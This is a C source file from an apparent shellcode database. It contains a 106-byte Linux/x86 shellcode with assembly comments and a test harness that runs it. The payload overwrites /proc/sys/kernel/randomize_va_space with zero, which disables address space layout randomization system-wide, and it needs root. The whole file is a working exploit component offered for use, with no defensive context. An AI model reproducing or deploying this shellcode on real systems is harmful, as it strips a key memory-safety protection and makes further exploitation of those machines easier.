/*
Title:	 Linux/x86 - Disable randomize stack addresse - 106 bytes
         (Set randomize_va_space to zero)
Author:  Jonathan Salwan <submit (!) shell-storm.org>
Web:     http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan

!Database of Shellcodes http://www.shell-storm.org/shellcode/

Date:	 2010-05-25
Tested:  Linux 2.6.33 - i686

! You need root euid
*/



#include <stdio.h>

char sc[] = "\x31\xdb"                // xor    %ebx,%ebx
            "\x6a\x61"                // push   $0x61
            "\x89\xe3"                // mov    %esp,%ebx
            "\xb0\x0a"                // mov    $0xa,%al
            "\xcd\x80"                // int    $0x80
            "\x31\xdb"                // xor    %ebx,%ebx
            "\x6a\x65"                // push   $0x65
            "\x66\x68\x61\x63"        // pushw  $0x6361
            "\x68\x61\x5f\x73\x70"    // push   $0x70735f61
            "\x68\x7a\x65\x5f\x76"    // push   $0x765f657a
            "\x68\x64\x6f\x6d\x69"    // push   $0x696d6f64
            "\x68\x2f\x72\x61\x6e"    // push   $0x6e61722f
            "\x68\x72\x6e\x65\x6c"    // push   $0x6c656e72
            "\x68\x73\x2f\x6b\x65"    // push   $0x656b2f73
            "\x68\x63\x2f\x73\x79"    // push   $0x79732f63
            "\x68\x2f\x70\x72\x6f"    // push   $0x6f72702f
            "\x89\xe3"                // mov    %esp,%ebx
            "\x30\xc0"                // xor    %al,%al
            "\xb0\x11"                // mov    $0x11,%al
            "\x31\xc9"                // xor    %ecx,%ecx
            "\x66\xb9\x41\x04"        // mov    $0x441,%cx
            "\x31\xd2"                // xor    %edx,%edx
            "\x66\xba\xa4\x01"        // mov    $0x1a4,%dx
            "\x31\xc0"                // xor    %eax,%eax
            "\xb0\x05"                // mov    $0x5,%al
            "\xcd\x80"                // int    $0x80
            "\x89\xc3"                // mov    %eax,%ebx
            "\x31\xc9"                // xor    %ecx,%ecx
            "\x66\x68\x30\x0a"        // pushw  $0xa30
            "\x89\xe1"                // mov    %esp,%ecx
            "\x31\xd2"                // xor    %edx,%edx
            "\xb2\x02"                // mov    $0x2,%dl
            "\x31\xc0"                // xor    %eax,%eax
            "\xb0\x04"                // mov    $0x4,%al
            "\xcd\x80"                // int    $0x80
            "\xb0\x01"                // mov    $0x1,%al
            "\xcd\x80";               // int    $0x80

int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(sc));
        (*(void(*)()) sc)();

return 0;
}